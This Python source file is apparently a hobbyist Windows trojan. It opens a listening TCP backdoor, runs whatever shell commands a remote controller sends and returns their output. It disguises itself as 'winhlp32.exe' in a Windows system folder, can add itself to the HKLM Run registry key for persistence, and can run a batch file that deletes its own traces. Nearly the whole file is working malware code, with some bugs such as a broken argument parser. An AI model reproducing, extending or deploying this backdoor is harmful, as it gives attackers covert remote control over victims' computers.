__author__ = 'Jonas'
import socket
import sys
import os
import subprocess
import win32api
import win32con
import inspect
import threading
import time
import shlex


def create_file(path):
    """
    creates a file at the given path
    :param path: (string) the string format of the path
    :return: (bool) whether it was successfully created or not
    """
    if not os.path.exists(path):
        os.system("@echo off")
        os.system("copy nul " + '''"{0}"'''.format(path))
        if os.path.exists(path):
            return True
        else:
            return False
    else:
        return True


class ScriptError(Exception):

    def __init__(self, string):
        self.message = string


class TCPServer(threading.Thread):
    """
    a simple tcp server application, capable of connecting to one single Client Application and establishing a stable
    one to one connection. Having to separate sockets for sending and receiving data, but it doesn't only receive data
    whenever the receive method is called, but rather always receives data into a local buffer and by calling the
    receive method the earliest received data is popped from the buffer and returned, alternatively one can call the
    receive_all method to get the whole list of the buffer at once, clearing it in the process.
    :ivar connected: (boolean) whether the server is currently connected to a client
    :ivar client_ip: (string) the ip of the client currently connected to the server
    :ivar receiving_socket: (socket) the server socket, which only receives data
    :ivar sending_socket: (socket) the client socket, only sending data
    :ivar receive_buffer: (list) the list containing all data received, since it ha been cleared the last time
    """
    def __init__(self):
        super(TCPServer, self).__init__()
        self.connected = False
        self.running = True
        self.connection = None
        self.client_ip = ""
        self.receiving_socket = socket.socket()
        self.receiving_socket.bind(("0.0.0.0", 8889))
        self.receiving_socket.listen(10)
        self.sending_socket = socket.socket()
        self.receive_buffer = []

    def run(self):
        """
        the main loop of the Server, only used to constantly listen for incoming connection requests and in case there
        is one, only receiving data and adding it to the buffer
        :return: (void)
        """
        while self.running:
            try:
                self.connection, adress = self.receiving_socket.accept()
                self.client_ip = adress[0]
                self.connected = True
                raw_data = self.connection.recv(4096)
                self.receive_buffer.append(str(str(raw_data)[2:-1]))
            except socket.error:
                self.connected = False

    def send(self, string):
        """
        sends the passed string to the client via the sending socket of the server
        :param string: (string) the data that is to be send
        :return: (void)
        """
        if self.connected is True:
            # creating a new client socket to send the data passed to the method
            self.sending_socket = socket.socket()
            print(self.client_ip + ":" + string)
            self.sending_socket.connect((self.client_ip, 8887))
            # sending the data string via the sending socket
            self.sending_socket.sendall(str.encode(string))
            # closing the client socket after the data has been sent
            self.sending_socket.close()

    def receive(self):
        """
        doesn't really actively receive data, but only accesses the internal buffer of stored data and returns the
        first item of the list, being the earliest received data. Returns None in case there is no item in the buffer
        :return: (string) or (None)
        """
        # returning the earliest received data, then deleting it from the buffered list
        if len(self.receive_buffer) >= 1:
            latest_data = self.receive_buffer[0]
            self.receive_buffer.remove(latest_data)
            return latest_data
        else:
            return None

    def receive_all(self):
        """
        doesn't really actively receive data, but only accesses the internal buffer of stored data and returns the whole
        list of data. Returns None in case there is no item in the buffer
        :return: (list)
        """
        if len(self.receive_buffer) >= 1:
            # returning the whole list of received data then clearing it to make space for new incoming data
            temp_list = self.receive_buffer
            self.receive_buffer = []
            return temp_list
        else:
            return None

    def terminate(self):
        """
        terminates the client application, stopping the thread and closing the remaining socket connections
        :return: (void)
        """
        # finally closes the connection to avoid throwing an exception on the server side
        self.receiving_socket.close()
        self.sending_socket.close()
        # stops the thread itself
        self.running = False
        self._stop()


class Trojan(threading.Thread):

    def __init__(self, port, server):
        super(Trojan, self).__init__()
        # the default path of the trojan on the windows computer
        self.path = "C:\\Windows\\Help\\Windows"
        self.name = "winhlp32.exe"
        self.port = port
        # setting up the protocols for the trojan
        self.script = {}
        self.server = server
        # the sequence symbolizing, that the trojan has finished writing into the TCP connection socket
        self.end_sequence = "<;end;>"

    def run(self):
        """
        the main loop of the trojan, always following a simple procedure. First waiting for an incoming data transfer
        request, after accepting it waiting to receive a message containing the command to be executed, which can either
        be a native windows cmds command, having the prefix "c:" or a custom predefined script, having the prefix "s:"
        :return: (void)
        """
        # enters the main loop without the break condition
        count = 0
        while True:
            # receives the next buffered message from the server object
            cmd = self.server.receive()
            # depending on the received prefix, executes the input either
            if cmd is not None:
                if cmd == "ping":
                    self.server.send("ping")
                elif cmd[:2] == "c:":
                    self.execute_command(cmd[2:])
                elif cmd[:2] == "s:":
                    self.execute_script(cmd[2:])
            time.sleep(0.01)

    def execute_command(self, command):
        """
        executes a default windows command, that has been passed from the trojan control as a subprocess
        and then sends back the returned output of the windows console
        :param command: (string) the string format of the command to be executed
        :return: (void)
        """
        try:
            print(shlex.split(command))
            process = subprocess.Popen(shlex.split(command), bufsize=1, stdin=subprocess.PIPE, stderr=subprocess.PIPE,
                                       stdout=subprocess.PIPE, universal_newlines=False)
            outs, errs = process.communicate(timeout=10)
            if len(errs) == 0:
                self.server.send("[*]" + str(outs, errors="ignore"))
            else:
                self.server.send("[!]" + str(errs, errors="replace"))
            self.server.send(self.end_sequence)
        except subprocess.TimeoutExpired as t:
            process.kill()
            outs, errs = process.communicate()
            if not(errs == "" or errs == " "):
                self.server.send(str(outs))
            else:
                self.server.send(errs)
            self.server.send(self.end_sequence)
        except Exception as e:
            self.server.send("[!] " + str(e))
            self.server.send(self.end_sequence)

    def execute_script(self, command):
        """
        executes a script, when given the command string containing the scripts name and parameters. Scripts are pre
        defined functions of the Trojan class, that can be added by simply adding a new method with the prefix
        'script_' followed by the scripts name.
        Scripts aren't exactly transmitted as normal strings they have a fixed format being:
        " name;arg1:value1;arg2:value2;arg3:value3;... "
        :param command: (string) the passed string format of the script to be executed
        :return:
        """
        script_name = self.get_script_name(command)
        script_arguments = self.get_script_arguments(command)
        try:
            accepted_arguments = inspect.getargspec(getattr(self, "script_" + script_name))[0][1:]
        except AttributeError:
            self.server.send("[!] the issued script is not in the list of already implemented scripts\n")
            return False
        for argument_name in script_arguments.keys():
            if argument_name not in accepted_arguments:
                self.server.send(str.encode("[!] " + argument_name + " is not in the list of accepted arguments\n"))
                return False
        try:
            reply = getattr(self, "script_" + script_name)(**script_arguments)
            self.server.send(reply)
        except ScriptError as e:
            self.server.send(e.message)
            return False
        except Exception as e:
            self.server.send(str(e))
            return False
        return True

    @staticmethod
    def get_script_name(command):
        """
        when given the issued script command, returns the name of the script called
        :param command: (string) the command received in regular string format
        :return: (string) the name of the script command issued
        """
        if ";" in command:
            return command.split(";")[0]
        else:
            return command

    @staticmethod
    def get_script_arguments(command):
        """
        when given the issued script command, returns a dictionary with the passed arguments
        :param command: (string) the command received in regular string format
        :return: (dict) a dictionary containing the argument name as the key and its corresponding value
        """
        arguments = {}
        if ";" in command:
            for arg_tuple in command.split(";")[1:]:
                arg_tuple_list = arg_tuple.split(":")
                arguments[arg_tuple_list[0]] = arguments[arg_tuple_list[1]]
        return arguments

    def script_destroy(self):
        """
        the script to order the trojan to self destruct itself on the pc it is currently installed on, by creating a
        windows batch file, that contains the code to delete the trojan.exe file within its original folder and the
        paper bin then deleting itself.the batch file is executed right before the trojan terminates itself with the
        sys.exit command preventing a runtime error to ocure as there is quite a big delay when executing a batch file.
        :return: (void)
        """
        self.server.send("[*] attempting to delete the trojan from the system")

        # creating the temporary batch file, containing the source code
        path = "C:\\Windows\\delete.bat"
        if create_file(path):
            self.server.send("[*] batch file to execute the deletion process created")
        else:
            self.server.send("[!] failed to create the needed batch file 'delete.bat'")
            self.server.send(self.end_sequence)
            return False

        # writing the source code into the batch file
        try:
            with open(path, mode="w") as file:
                file.write('''@echo off\nDEL /Q /F "C:\\Windows\\Help\\Windows\\MSVCR100.dll"\n''')
                file.write('''DEL /Q /F "C:\\Windows\\Help\\Windows\\winhlp32.exe"\n''')
                file.write("DEL "+path)
            self.server.send("[*] written source code into the batch file")
        except (OSError, IOError) as e:
            self.server.send("[!] failed to write source code into the batch file")
            self.server.send(self.end_sequence)
        # sending the reply, then executing the just created batch executable, then terminating the program
        self.server.send("[+] trojan has been deleted and is now inactive")
        self.server.send(self.end_sequence)
        os.system(path)
        sys.exit()

    def script_setup_autostart(self):
        """
        will create a registry key within the startup folder of the computers registry, that contains the path to
        the trojan executable, so that the trojan will be available whenever the target pc is running
        :return: (void)
        """
        self.server.send("[*] attempting to add a autorun routine within the system registry")

        # attempts to create a key in the autorun folder of the registry and write the according value into it
        key = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        try:
            win32api.RegSetValue(win32con.HKEY_LOCAL_MACHINE, key, win32con.REG_SZ,
                                 str(self.path + "\\" + self.name))
            time.sleep(1)
            self.server.send("[*] written startup value to the created registry key '{0}'".format(key))
            self.server.send(self.end_sequence)
        except:
            self.server.send("[!] failed to create the autorun key")
            self.server.send(self.end_sequence)

if __name__ == "__main__":
    server = TCPServer()
    server.start()
    trojanthread = Trojan(8888, server)
    trojanthread.start()
